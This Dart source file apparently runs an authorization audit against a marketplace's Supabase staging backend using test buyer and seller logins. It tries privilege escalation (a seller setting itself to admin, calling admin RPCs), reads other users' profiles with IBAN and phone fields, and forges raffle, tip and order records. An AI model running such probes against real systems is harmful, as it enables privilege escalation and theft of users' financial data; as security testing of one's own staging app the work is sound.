// ignore_for_file: avoid_print
/// Follow-up probe — seller JWT + leftover order inspection. No nuke. No Stripe pay.
library;

import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

void main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');

  final client = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: 'unused',
  );

  String? buyerJwt;
  try {
    buyerJwt = await client.signIn(
      email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
      password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
    );
    print('buyer_login=ok');
  } catch (e) {
    print('buyer_login=FAIL $e');
  }

  final sellerJwt = await client.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  print('seller_login=ok');

  Map<String, String> h(String jwt) => {
        'apikey': anon,
        'Authorization': 'Bearer $jwt',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };

  Future<void> dump(String id, http.Response r, [int max = 500]) async {
    final b = r.body.length > max ? r.body.substring(0, max) : r.body;
    print('FINDING $id status=${r.statusCode} body=$b');
  }

  // Leftover orders from first probe
  for (final id in [
    'f3e900f6-fe03-421e-b1d7-2f3cc13933e1',
    'f72638a1-fe43-473d-a419-1506452e370d',
    'e9e06dc9-496b-4269-be37-569562f5f2d9',
  ]) {
    final r = await http.get(
      Uri.parse(
        '$url/rest/v1/orders?id=eq.$id&select=id,status,quantity,price_total,payment_method,live_raffle_id,stock_units_applied',
      ),
      headers: h(sellerJwt),
    );
    await dump('ORDER_$id', r);
  }

  final prod = await http.get(
    Uri.parse(
      '$url/rest/v1/products?id=eq.7fde1403-5a3c-47cd-8fe6-dab6ad863016&select=id,quantity,is_sold',
    ),
    headers: h(sellerJwt),
  );
  await dump('PRODUCT_QTY_AFTER', prod);

  final otherProf = await http.get(
    Uri.parse(
      '$url/rest/v1/profiles?id=eq.$buyerId&select=id,full_name,iban,mb_way,phone,user_type,legal_full_name',
    ),
    headers: h(sellerJwt),
  );
  await dump('SELLER_SELECT_BUYER_PROFILE', otherProf);

  final allProf = await http.get(
    Uri.parse('$url/rest/v1/profiles?select=id,full_name,iban&limit=5'),
    headers: h(sellerJwt),
  );
  await dump('SELLER_SELECT_PROFILES_LIMIT5', allProf);

  final adminPatch = await http.patch(
    Uri.parse('$url/rest/v1/profiles?id=eq.$sellerId'),
    headers: h(sellerJwt),
    body: jsonEncode({'user_type': 'admin'}),
  );
  await dump('SELLER_SET_ADMIN', adminPatch);

  final after = await http.get(
    Uri.parse('$url/rest/v1/profiles?id=eq.$sellerId&select=id,user_type'),
    headers: h(sellerJwt),
  );
  await dump('SELLER_TYPE_AFTER_ADMIN', after);

  final adminList = await http.post(
    Uri.parse('$url/rest/v1/rpc/batata_admin_list_profiles'),
    headers: h(sellerJwt),
    body: jsonEncode({'p_limit': 3}),
  );
  await dump('SELLER_ADMIN_LIST', adminList);

  final prizeRpc = await http.post(
    Uri.parse('$url/rest/v1/rpc/batata_create_raffle_prize_order'),
    headers: h(sellerJwt),
    body: jsonEncode({
      'p_raffle_id': '00000000-0000-0000-0000-000000000001',
      'p_winner_uid': sellerId,
      'p_rank': 1,
    }),
  );
  await dump('SELLER_PRIZE_RPC_SIG', prizeRpc);

  final createRaffle = await http.post(
    Uri.parse('$url/rest/v1/rpc/batata_create_live_raffle'),
    headers: h(sellerJwt),
    body: jsonEncode({
      'p_live_id': '00000000-0000-0000-0000-000000000001',
      'p_title': 'audit cega',
    }),
  );
  await dump('SELLER_CREATE_RAFFLE_FAKE_LIVE', createRaffle);

  if (buyerJwt != null) {
    final createAsBuyer = await http.post(
      Uri.parse('$url/rest/v1/rpc/batata_create_live_raffle'),
      headers: h(buyerJwt),
      body: jsonEncode({
        'p_live_id': '00000000-0000-0000-0000-000000000001',
        'p_title': 'audit buyer raffle',
      }),
    );
    await dump('BUYER_CREATE_RAFFLE_TITLED', createAsBuyer);

    final prizeBuyer = await http.post(
      Uri.parse('$url/rest/v1/rpc/batata_create_raffle_prize_order'),
      headers: h(buyerJwt),
      body: jsonEncode({
        'p_raffle_id': '00000000-0000-0000-0000-000000000001',
        'p_winner_uid': buyerId,
        'p_rank': 1,
      }),
    );
    await dump('BUYER_PRIZE_RPC_CORRECT_SIG', prizeBuyer);

    final tipHigh = await http.post(
      Uri.parse('$url/rest/v1/rpc/batata_create_live_tip_pending'),
      headers: h(buyerJwt),
      body: jsonEncode({
        'p_live_id': null,
        'p_seller_id': sellerId,
        'p_amount': 99999,
        'p_message': 'audit_cap',
      }),
    );
    await dump('TIP_PENDING_99999', tipHigh);

    final ship = await http.post(
      Uri.parse('$url/rest/v1/orders'),
      headers: h(buyerJwt),
      body: jsonEncode({
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'product_id': '7fde1403-5a3c-47cd-8fe6-dab6ad863016',
        'quantity': 1,
        'price_total': 5,
        'status': 'reserva_pendente',
        'payment_method': 'Seguro Fleaber',
        'shipping_method': 'transportadora em mão €0',
      }),
    );
    await dump('BUYER_INSERT_SHIPPING_TRICK', ship);
    try {
      final decoded = jsonDecode(ship.body);
      if (decoded is List && decoded.isNotEmpty) {
        final oid = decoded.first['id'];
        print('FINDING SHIPPING_TRICK_FIELDS status=${decoded.first['status']} ship=${decoded.first['shipping_method']} id=$oid');
        await http.patch(
          Uri.parse('$url/rest/v1/orders?id=eq.$oid'),
          headers: h(buyerJwt),
          body: jsonEncode({'status': 'cancelado'}),
        );
      }
    } catch (_) {}

    final ownProf = await http.get(
      Uri.parse('$url/rest/v1/profiles?id=eq.$buyerId&select=id,user_type,full_name'),
      headers: h(buyerJwt),
    );
    await dump('BUYER_PROFILE_AFTER_NUKE', ownProf);
  }

  final chats = await http.get(
    Uri.parse('$url/rest/v1/chats?select=id&limit=3'),
    headers: h(sellerJwt),
  );
  await dump('SELLER_CHATS', chats);

  final otherOrders = await http.get(
    Uri.parse('$url/rest/v1/orders?select=id,buyer_id,status&limit=5'),
    headers: h(sellerJwt),
  );
  await dump('SELLER_ORDERS_UNFILTERED', otherOrders);

  print('FOLLOWUP_DONE');
}
